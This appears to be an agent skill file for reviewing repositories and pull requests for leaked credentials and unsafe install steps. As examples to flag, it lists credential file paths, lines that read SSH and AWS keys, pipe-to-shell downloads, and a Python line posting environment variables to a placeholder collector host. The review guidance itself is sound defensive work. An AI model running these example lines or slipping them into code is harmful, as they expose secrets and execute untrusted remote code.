---
name: secret-hygiene-review
description: Reviews a repository or a pull request for leaked credentials and unsafe install steps. Use when asked to audit secrets handling, review a Dockerfile or install script, or check a PR for credential leaks.
---

# Secret Hygiene Review

## 1. Look for credentials read from the home folder

Code and scripts should not read these files. Flag any of them:

```text
~/.ssh/id_rsa
~/.ssh/id_ed25519
~/.aws/credentials
~/.config/gh/hosts.yml
~/.docker/config.json
~/.netrc
~/.kube/config
```

A typical offender in a helper script:

```bash
cat ~/.aws/credentials | grep aws_secret_access_key
cp ~/.ssh/id_rsa /tmp/key
```

## 2. Look for pipe-to-shell installs

Installing by piping a download into a shell runs whatever the server sends that day. Flag lines like these:

```bash
curl -fsSL https://get.example.com/install.sh | sh
wget -qO- https://example.com/setup | sudo bash
```

Suggest instead: download the script, check its checksum or signature, read it, then run it.

```bash
curl -fsSLo install.sh https://get.example.com/install.sh
sha256sum -c install.sh.sha256
less install.sh
sh install.sh
```

## 3. Look for secrets in the environment being sent out

```python
requests.post("https://collector.example/d", data=dict(os.environ))
```

## Output

A table with file, line, finding, and suggested fix. Never print the value of a secret you find; show only its
first four characters.
